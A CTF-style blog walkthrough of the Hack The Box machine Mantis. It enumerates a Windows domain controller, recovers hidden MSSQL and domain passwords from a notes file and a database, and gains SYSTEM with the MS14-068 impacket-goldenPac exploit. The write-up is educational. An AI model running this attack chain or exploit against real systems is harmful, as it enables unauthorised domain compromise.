---
title: HTB - CCT INF Path - Mantis 
date: 2024-12-16 09:37:11 +/-TTTT
categories: [CTFs, HTB]
tags: [ctfs, hacking, htb, ctt_inf]     # TAG names should always be lowercase
---


![alt text](/assets/images/16-12-2024/mantis/card.png "Mantis Card")

# Initial Setup and 

## Setup
```bash
export target=10.10.10.52
cp /etc/hosts .
```

This will define a variable so we don't need to remember the IP address. Copying `/etc/hosts` to the directory will also allow us to keep track of hosts and subdomains, this is helpful for going back to machines as all the information is kept in the directory and copied to `/etc/hosts` when needed.

# Enumeration
![alt text](/assets/images/27-11-2024/enumerate.gif "Dalek")

Alrighty let's get cracking! Starting with an `nmap`:
```bash
nmap -p- -sCV -oA scans/nmap_full -v $target
```

Output:
```bash
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-12-16 08:44:10Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1337/tcp  open  http         Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.52:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-12-16T08:38:02
| Not valid after:  2054-12-16T08:38:02
| MD5:   f4bf:a897:720b:94c2:857f:6db9:e138:1b79
|_SHA-1: f600:cd91:3fa1:573c:e5cc:2901:68c1:2821:a717:7309
|_ssl-date: 2024-12-16T08:45:14+00:00; 0s from scanner time.
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc        Microsoft Windows RPC
8080/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Tossed Salad - Blog
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
49168/tcp open  msrpc        Microsoft Windows RPC
50255/tcp open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-info: 
|   10.10.10.52:50255: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 50255
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-12-16T08:38:02
| Not valid after:  2054-12-16T08:38:02
| MD5:   f4bf:a897:720b:94c2:857f:6db9:e138:1b79
|_SHA-1: f600:cd91:3fa1:573c:e5cc:2901:68c1:2821:a717:7309
| ms-sql-ntlm-info: 
|   10.10.10.52:50255: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
|_ssl-date: 2024-12-16T08:45:14+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2024-12-16T03:45:07-05:00
|_clock-skew: mean: 42m51s, deviation: 1h53m24s, median: 0s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2024-12-16T08:45:06
|_  start_date: 2024-12-16T08:37:48

```
The key takeaways from above are:
- Appears to be a `Windows Server 2008 R2`
- Hostname is `MANTIS`.
- Domain is called `htb.local`
- `53/88/389/3268` make this machine extremely likely to be a Domain Controller.
- Presence of Microsoft SQL Server 2014
- `1337` open, this isn't a standard port. Also this appears to be a web server.
- Alternative http port open on `8080`

Our `/etc/hosts` file now looks like:
```bash
127.0.0.1       localhost
127.0.1.1       kali

10.10.10.52     mantis mantis.htb.local htb.local
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```



## Obtaining user
Port `1337` is being hosted via IIS 7.5 from our nmap output. We can also check this by visiting the page:
![alt text](/assets/images/16-12-2024/mantis/iis.png "IIS7")

Older versions of IIS are susceptible to short name scanning. I always use the Metasploit module to test for this. Means avoiding Java, which is always a win.
Plumbing in the `rhost` and `rport` information we can see the target returns information:
![alt text](/assets/images/16-12-2024/mantis/meta.png "Metasploit")

We are presented with two findings `aspnet*~1` and `secure*~1`. As this is IIS `aspnet*~1` is most probably going to be `aspnet_client`. This folder is standard when using IIS and can generally be ignored.
`secure*~1` is more interesting, as shortname scanning doesn't give the full name we can use `ffuf` to try and find the rest:
```bash
ffuf -w dicc.txt -u http://mantis.htb.local:1337/secureFUZZ
```
![alt text](/assets/images/16-12-2024/mantis/ffuf.png "FFUF")

It would appear `secure_notes` is a valid directory:
![alt text](/assets/images/16-12-2024/mantis/web.png "Secure_notes")

We cannot download `web.config` as we're presented with a `404`, however we can download the oddly named `dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt`:
```bash
1. Download OrchardCMS
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
3. Launch IIS and add new website and point to Orchard CMS folder location.
4. Launch browser and navigate to http://localhost:8080
5. Set admin password and configure sQL server connection string.
6. Add blog pages with admin user.
[.. SNIP..]
Credentials stored in secure format
OrchardCMS admin creadentials 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
SQL Server sa credentials file namez
```
"Bear" with me, this bit is a bit CTFy. Take the binary and translate it to text:
```python
import binascii
binary = int("0b010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001" ,2)
binascii.unhexlify('%x' % binary).decode()
```
![alt text](/assets/images/16-12-2024/mantis/bin2string.png "Bin2String")

Lovely so we have a password of:
```
@dm!n_P@ssW0rd!
```

Another CTF bit coming up, the filename appears to contain a base64 string:
```
NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx
```
Decode:
```bash
echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d
6d2424716c5f53405f504073735730726421
```
More... it's now hex
```bash
echo "NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx" | base64 -d | xxd -r -p
m$$ql_S@_P@ssW0rd!
```

Another password!
```
m$$ql_S@_P@ssW0rd!
```

Lovely, so we now appear to have two passwords, also a username from the weirdly named file:
```
2. Download SQL server 2014 Express ,create user "admin",and create orcharddb database
```

Let's connect to MSSQL using the MSSQL looking password, the username `admin` and the database `orcharddb`. Fingers crossed:

![alt text](/assets/images/16-12-2024/mantis/mssql.png "MSSQL")
Bingo bongo! 
Enumerating tables:
```sql
SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE'
```
This outputs a lot of output, the one that stands out to me is:
```
blog_Orchard_Users_UserPartRecord
```
Let's have a peek!
```sql
SELECT * FROM blog_Orchard_Users_UserPartRecord;
```

![alt text](/assets/images/16-12-2024/mantis/mssql_pass.png "james' Password")

There appears to be a plaintext password in James' password field, odd. Let's quickly see if that works on the site:

![alt text](/assets/images/16-12-2024/mantis/broken.png "Lol")

Indeed... it breaks the login functionality for James... nice.

However the username `james@htb.local` means it appears to be a domain account. Let's test this:
![alt text](/assets/images/16-12-2024/mantis/null.png "null")
As expected, now with creds:
```bash
rpcclient -U "htb.local/james" mantis.htb.local
```
![alt text](/assets/images/16-12-2024/mantis/rpcclient.png "Rpcclient")

This shows that we now have valid domain credentials.

Let's check what group membership `james` has.
![alt text](/assets/images/16-12-2024/mantis/rpcclient_2.png "Rpcclient")

It would appear `james` is only a part of `domain users` this doesn't help us too much. 

We don't currently have a flag... but I'll take this stage to move to `root.txt` as we "technically" have our user.

## Obtaining root.txt
Checking easy wins such as kerberoasting, asrep-roasting, delegation and shares etc produced nothing.

Previously we noted the OS running was `Windows Server 2008 R2`, various checks for CVE's for that version returned nothing. However `MS14-068` did not!

[Microsoft MS14-068 Security Bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-068)



```
This security update is rated Critical for all supported editions of Windows Server 2003, Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, and Windows Server 2012 R2. The update is also being provided on a defense-in-depth basis for all supported editions of Windows Vista, Windows 7, Windows 8, and Windows 8.1. For more information, see the Affected Software section.
```

This is a rather complicated attack and something I may write a blog on later... but here's the attack.

```bash
impacket-goldenPac htb.local/james@mantis.htb.local
```
![alt text](/assets/images/16-12-2024/mantis/system.png "System")

At the end of the attack chain PsExec is used to provide us with a shell. Previously this wasn't tidied up on this box and allowed for an unintended method of getting system. Anyway.....

From here we can get both `user.txt` and `root.txt`

Win?

![alt text](/assets/images/16-12-2024/mantis/done.gif "Done")




## TLDR
- Port `1337` open, that is running out dated IIS.
- Through shortname scanning we find `secure_notes` and a weird file.
- Weird file contains two passwords and a username hidden in a CTF manner, gives us access to MSSQL.
- Password in MSSQL gives us access to the domain as `james`.
- Domain Controller is vulnerable to `MS14-068` "Golden Pac".